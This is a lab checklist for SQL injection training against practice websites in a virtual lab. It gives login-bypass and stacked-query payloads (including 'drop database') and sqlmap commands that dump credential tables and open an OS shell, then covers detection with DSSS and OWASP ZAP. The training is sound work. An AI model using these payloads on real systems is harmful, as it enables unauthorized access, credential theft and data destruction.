# Lab Tasks Checklist: SQL Injection

## Lab 1: Perform SQL Injection Attacks

### **Lab Scenario**

SQL injection attacks target input vulnerabilities in web applications to manipulate backend databases. These attacks allow an attacker to access or modify sensitive data, bypass authentication, or even execute remote commands.

### **Lab Objectives**

- Perform SQL injection on an MSSQL database.
- Extract database information using sqlmap.

### **Lab Environment**

- **Virtual Machines**: Windows 11, Windows Server 2019, Parrot Security
- **Tools**: Web browser, sqlmap
- **Permissions**: Administrator access
- **Internet Connection**: Required

### **Checklist**

#### Perform SQL Injection on MSSQL Database

1. [ ]  Turn on the Windows 11 and Windows Server 2019 virtual machines.
2. [ ]  Open the GoodShopping website on Windows 11.
3. [ ]  Test basic SQL injection:
    - Username: `blah' or 1=1 --`
    - Password: Leave blank.
4. [ ]  Verify unauthorized access as a logged-in user.
5. [ ]  Switch to Windows Server 2019 to view the database using Microsoft SQL Server Management Studio.
6. [ ]  Query the login database to observe current users.
7. [ ]  Inject malicious SQL to add a new user:
    - Query: `blah'; insert into login values ('john','apple123'); --`
8. [ ]  Log in with the new credentials to verify success.
9. [ ]  Create a new database using injection:
    - Query: `blah'; create database mydatabase; --`
10. [ ]  Confirm database creation on Windows Server 2019.
11. [ ]  Delete the created database using:
    - Query: `blah'; drop database mydatabase; --`
12. [ ]  Verify deletion in SQL Server Management Studio.

---

## Lab 2: Perform SQL Injection Using sqlmap

### **Lab Scenario**

Automate the detection and exploitation of SQL injection vulnerabilities using sqlmap to extract sensitive database information.

### **Lab Objectives**

- Enumerate databases using sqlmap.
- Extract table and column information from the database.
- Retrieve sensitive user credentials.

### **Lab Environment**

- **Virtual Machines**: Parrot Security, Windows Server 2019
- **Tools**: sqlmap
- **Permissions**: Administrator access
- **Internet Connection**: Required

### **Checklist**

1. [ ]  Launch Parrot Security and log in as the attacker.
2. [ ]  Open a browser and log in to the MovieScope website.
3. [ ]  Capture a session cookie using the browser's developer tools.
4. [ ]  Run sqlmap to enumerate databases:
    - Command: `sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie_value>" --dbs`
5. [ ]  Select a database (e.g., `moviescope`) and enumerate its tables:
    - Command: `sqlmap -u "<URL>" --cookie="<cookie_value>" -D moviescope --tables`
6. [ ]  Extract sensitive data from a specific table:
    - Command: `sqlmap -u "<URL>" --cookie="<cookie_value>" -D moviescope -T User_Login --dump`
7. [ ]  Verify credentials by logging into the website with the extracted user details.
8. [ ]  Use sqlmap to open an OS shell:
    - Command: `sqlmap -u "<URL>" --cookie="<cookie_value>" --os-shell`
9. [ ]  Execute commands in the OS shell to gather additional information about the system.

---

## Lab 3: Detect SQL Injection Vulnerabilities

### **Lab Scenario**

Identify SQL injection vulnerabilities in a web application using tools like DSSS and OWASP ZAP.

### **Lab Objectives**

- Detect vulnerabilities using Damn Small SQLi Scanner (DSSS).
- Scan for SQL injection vulnerabilities with OWASP ZAP.

### **Lab Environment**

- **Virtual Machines**: Windows Server 2019, Parrot Security
- **Tools**: DSSS, OWASP ZAP
- **Permissions**: Administrator access
- **Internet Connection**: Required

### **Checklist**

#### Using DSSS

1. [ ]  Open a terminal in Parrot Security and navigate to the DSSS folder.
2. [ ]  Run DSSS to scan the MovieScope website:
    - Command: `python3 dsss.py -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie_value>"`
3. [ ]  Observe the output for vulnerabilities and copy the vulnerable URL.
4. [ ]  Open the URL in a browser to verify vulnerabilities.

#### Using OWASP ZAP

1. [ ]  Launch OWASP ZAP on Windows Server 2019.
2. [ ]  Perform an automated scan on the target website:
    - URL: `http://www.moviescope.com`
3. [ ]  Review alerts for SQL injection vulnerabilities under the Alerts tab.
4. [ ]  Expand SQL Injection alerts to analyze risk, confidence, and parameters.

---
---

# Step-by-Step
